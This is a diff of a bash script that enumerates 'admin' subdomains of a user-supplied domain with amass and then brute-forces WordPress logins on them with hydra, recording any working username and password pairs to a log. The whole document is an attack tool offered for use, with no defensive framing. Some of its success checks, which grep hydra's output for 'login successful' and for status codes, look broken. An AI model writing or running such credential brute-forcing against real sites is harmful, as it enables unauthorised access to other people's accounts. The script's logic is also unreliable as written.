@@ -1,10 +1,10 @@
 #!/bin/bash
-
+toilet SETAB
 # Prompt the user for a URL
-read -p "Enter a URL: " url
+read -p "Enter a URL (example.com): " url
 
-# Use the `subfinder` command to find subdomains
-subdomains=$(subfinder -d $url -s | grep "admin")
+# Use the `amass` command to find subdomains
+subdomains=$(amass intel -whois -d $url | grep "admin")
 
 # Print the subdomains
 echo "Subdomains containing 'admin':"
@@ -17,19 +17,19 @@ logfile="./brute-force.log"
 for sub in $subdomains; do
   # Read the wordlist file
   while read line; do
-    # Perform the brute force attack
+    # Perform the brute force attack using hydra
     echo "Trying $line:$line on $sub"
-    status_code=$(curl -s -o /dev/null -w "%{http_code}" --user "$line:$line" $sub)
-    if [ $status_code -eq 200 ]; then
+    result=$(hydra -l "$line" -p "$line" "$sub" http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:S=Location")
+    if echo "$result" | grep -q "login successful"; then
       echo "Credentials found: $line:$line"
       echo "Credentials found: $line:$line" >> $logfile
       break
-    elif [ $status_code -eq 403 ]; then
+    elif echo "$result" | grep -q "401" || echo "$result" | grep -q "407"; then
       echo "Invalid credentials: $line:$line"
       echo "Invalid credentials: $line:$line" >> $logfile
     else
-      echo "Error: $status_code"
-      echo "Error: $status_code" >> $logfile
+      echo "Error: $result"
+      echo "Error: $result" >> $logfile
     fi
   done < wordlist.txt
 done
